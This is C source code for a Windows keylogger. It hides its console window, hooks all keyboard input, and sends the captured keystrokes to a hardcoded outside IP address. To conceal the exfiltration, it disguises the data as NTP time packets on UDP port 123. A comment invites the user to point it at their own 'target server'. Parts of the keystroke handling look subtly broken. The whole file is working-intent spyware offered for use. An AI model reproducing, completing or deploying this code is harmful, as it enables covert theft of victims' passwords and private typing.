#include <stdio.h>
#include <conio.h>
#include <winsock2.h>
#include <unistd.h>
#include <windows.h>
#include <dirent.h>
#include <winuser.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <stdint.h>
#include<stdio.h>
#include<winsock2.h>


// ================= Change IP address to you target server ========================
#define SERVER "165.227.145.66"	
// ================= Change IP address to you target server ========================






#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define NTP_TIMESTAMP_DELTA 2208988800ull


#define BUFLEN 512	//Max length of buffer
#define PORT 123	//The port on which to listen for incoming data


HHOOK hook;
LPMSG msg;
FILE *LOG;

typedef struct{

    uint8_t li_vn_mode;      // Eight bits. li, vn, and mode.
                            // li.   Two bits.   Leap indicator.
                            // vn.   Three bits. Version number of the protocol.
                            // mode. Three bits. Client will pick mode 3 for client.

    uint8_t stratum;         // Eight bits. Stratum level of the local clock.
    uint8_t poll;            // Eight bits. Maximum interval between successive messages.
    uint8_t precision;       // Eight bits. Precision of the local clock.

    uint32_t rootDelay;      // 32 bits. Total round trip delay time.
    uint32_t rootDispersion; // 32 bits. Max error aloud from primary clock source.
    uint32_t refId;          // 32 bits. Reference clock identifier.

    uint32_t refTm_s;        // 32 bits. Reference time-stamp seconds.
    uint32_t refTm_f;        // 32 bits. Reference time-stamp fraction of a second.

    uint32_t origTm_s;       // 32 bits. Originate time-stamp seconds.
    uint32_t origTm_f;       // 32 bits. Originate time-stamp fraction of a second.

    uint32_t rxTm_s;         // 32 bits. Received time-stamp seconds.
    uint32_t rxTm_f;         // 32 bits. Received time-stamp fraction of a second.

    uint32_t txTm_s;         // 32 bits and the most important field the client cares about. Transmit time-stamp seconds.
    uint32_t txTm_f;         // 32 bits. Transmit time-stamp fraction of a second.

} ntp_packet;              // Total: 384 bits or 48 bytes.



char packet[sizeof(ntp_packet)] = { 
    0x01,0x01,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02,
    0x02,0x02,0x02,0x02,0x02 
};


char find_hex_of_char(char mychar){
    char character_array[93] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',  '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', '`', '{', '|', '}', '~' };
    
    char hex_array[93] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60,  0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x57, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x58 };
    
    // printf("%c", character_array[0]);
    

    for(int i = 0; i <= sizeof(character_array) - 1; i++){

        if(character_array[i] == mychar){
            // printf("%c", character_array[i]);
            // printf("%c", hex_array[i]);
            return hex_array[i];
        }
    }
    
}

void convert_char_to_hex_array(char char_arr[]){
    
    for(int i = 0; i <= strlen(char_arr) - 1; i++){
        
        char hex_val = find_hex_of_char(char_arr[i]);
        packet[i] = hex_val;
        
    }
}

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}



int sockfd, n;
    
struct sockaddr_in si_other;
int s, slen=sizeof(si_other);
WSADATA wsa;






int index = 0;
char* send_str_arr[48];
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    
    if (wParam == WM_KEYDOWN)
    {

        // printf("%s", lParam);

        strcat(send_str_arr, lParam);

        
        index = index + 1;
        if(index == 47){
            
            index = 0;
            
        
            convert_char_to_hex_array(send_str_arr);
            strcpy(send_str_arr, "");
            
            sendto(s, ( char* ) &packet, sizeof(ntp_packet) , 0 , (struct sockaddr *) &si_other, slen);

        }
        

    }

    // printf("%s", packet);
    
    return CallNextHookEx(hook,code,wParam,lParam);	
    
}



int main(int argc, char *argv[])
{
		Stealth();

    //Initialise winsock
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        exit(EXIT_FAILURE);
    }
    printf("Initialised.\n");

    //create socket
    if ( (s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
    {
        printf("socket() failed with error code : %d" , WSAGetLastError());
        exit(EXIT_FAILURE);
    }

    //setup address structure
    memset((char *) &si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(PORT);
    si_other.sin_addr.S_un.S_addr = inet_addr(SERVER);

    
    // printf("%s", &packet);
    // sendto(s, ( char* ) &packet, sizeof(ntp_packet) , 0 , (struct sockaddr *) &si_other, slen);

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook != NULL) 
        puts("All is good");
    else
        puts("Something went wrong :(");
    while(GetMessage(msg, NULL, 0, 0) > 0) {
        
        TranslateMessage(msg);
        DispatchMessage(msg);
    
    }

	




	// closesocket(s);
	// WSACleanup();

    // return 0;
}
